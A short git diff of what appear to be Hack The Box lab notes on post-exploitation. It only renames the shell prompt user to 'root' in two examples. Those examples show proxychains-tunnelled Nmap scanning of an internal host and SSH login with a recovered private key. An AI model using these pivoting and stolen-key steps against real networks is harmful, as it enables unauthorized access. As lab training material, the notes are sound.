 [-] No arch selected, selecting arch: x64 from the payload
@@ -4072,7 +4072,7 @@ Now we can test this out by running Nmap against the target, and we confirm that
 &#x20; Post-Exploitation
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ proxychains nmap -sT -p 22 172.16.9.25
+root@htb[/htb]$ proxychains nmap -sT -p 22 172.16.9.25
 
 ProxyChains-3.1 (http://proxychains.sf.net)
 Starting Nmap 7.92 ( https://nmap.org ) at 2022-06-22 21:42 EDT
@@ -4092,7 +4092,7 @@ Finally, we can try each SSH key with proxychains to attempt to connect to the h
 &#x20; Post-Exploitation
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ proxychains ssh -i ssmallsadm-id_rsa ssmallsadm@172.16.9.25
+root@htb[/htb]$ proxychains ssh -i ssmallsadm-id_rsa ssmallsadm@172.16.9.25
 
 ProxyChains-3.1 (http://proxychains.sf.net)
 |S-chain|-<>-127.0.0.1:9050-<><>-172.16.9.25:22-<><>-OK
